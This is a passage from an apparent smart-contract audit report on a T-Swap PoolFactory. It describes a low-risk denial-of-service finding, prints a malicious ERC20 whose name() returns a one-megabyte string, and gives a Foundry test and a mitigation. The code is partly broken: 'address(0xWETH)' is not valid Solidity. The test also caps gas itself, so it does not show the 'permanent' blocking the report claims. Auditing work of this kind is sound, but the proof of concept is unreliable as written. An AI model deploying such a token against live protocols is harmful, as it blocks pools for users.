    s_pools[tokenAddress] = address(tPool);
    s_tokens[address(tPool)] = tokenAddress;
    emit PoolCreated(tokenAddress, address(tPool));
    return address(tPool);
}
```



# Low Risk Findings

## [L-1]. DOS issue in PoolFactory::createPool

## Description
The `createPool` function constructs the name and symbol for the new pool's LP token by making an external call to `name()` on the provided `tokenAddress` and using `string.concat`. The gas cost of `string.concat` is proportional to the length of the concatenated strings. A malicious actor could deploy a token contract whose `name()` function returns a very long string. When `createPool` is called for this token, the `string.concat` operation can consume an excessive amount of gas, potentially exceeding the transaction's gas limit or even the block gas limit. This would cause the transaction to revert, effectively preventing a pool from ever being created for that token.

## Impact
An attacker can create a token contract that prevents a T-Swap pool from being created for it. This is a limited Denial of Service attack that affects only the specific malicious token. It does not impact the creation of pools for other, well-behaved tokens. However, it breaks the permissionless nature of the protocol for certain tokens.

## Proof of Concept
Deploy a token whose `name()` allocates a 1 000 000-byte string. The memory expansion cost alone is >2 M gas. When `PoolFactory.createPool` is called with a constrained gas stipend (e.g. 800 000 gas), the call invariably runs out of gas during `string.concat`, reverting and preventing the pool from being created:

1. Malicious user deploys `HugeNameToken` (see test below).
2. Anyone invokes `PoolFactory.createPool{gas: 800_000}(address(hugeNameToken))`.
3. `IERC20(token).name()` returns the 1 MB string → >2 M gas consumed copying data.
4. Because only 800 000 gas was forwarded, the call reverts with out-of-gas, permanently blocking pool creation for that token.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.20;

import "forge-std/Test.sol";
import "src/PoolFactory.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";

// ──────────────────────────────────────────────────────────────
// Malicious ERC20 that returns a 1-MB name string
// ──────────────────────────────────────────────────────────────
contract HugeNameToken is IERC20 {
    function name() external pure returns (string memory) {
        uint256 len = 1_000_000; // 1 MB
        bytes memory data = new bytes(len); // allocate but do not fill
        return string(data);
    }

    // Minimal ERC20 implementation ------------------------------------------------
    function symbol() external pure returns (string memory) { return "HNT"; }
    function decimals() external pure returns (uint8) { return 18; }
    function totalSupply() external pure returns (uint256) { return 0; }
    function balanceOf(address) external pure returns (uint256) { return 0; }
    function transfer(address, uint256) external pure returns (bool) { return true; }
    function allowance(address, address) external pure returns (uint256) { return 0; }
    function approve(address, uint256) external pure returns (bool) { return true; }
    function transferFrom(address, address, uint256) external pure returns (bool) { return true; }
}

// ──────────────────────────────────────────────────────────────
// Test
// ──────────────────────────────────────────────────────────────
contract DoSTest is Test {
    PoolFactory factory;
    HugeNameToken huge;

    function setUp() public {
        factory = new PoolFactory(address(0xWETH));
        huge = new HugeNameToken();
    }

    function test_GasExhaustionBlocksPoolCreation() public {
        // Forward an insufficient gas stipend so the concat blows up.
        vm.expectRevert();
        factory.createPool{gas: 800_000}(address(huge));
    }
}

## Suggested Mitigation
Avoid using unbounded external data to construct state. The mitigation is the same as for the phishing vulnerability: use a deterministic and bounded naming scheme based on the token's address rather than its user-controllable `name()`.

```solidity
// Import OpenZeppelin's Strings library
import {Strings} from "@openzeppelin/contracts/utils/Strings.sol";

// ... inside createPool function ...
string memory tokenAddrStr = Strings.toHexString(uint256(uint160(tokenAddress)));
string memory liquidityTokenName = string.concat("T-Swap-LP-", tokenAddrStr);
string memory liquidityTokenSymbol = string.concat("tsLP-", tokenAddrStr);
```



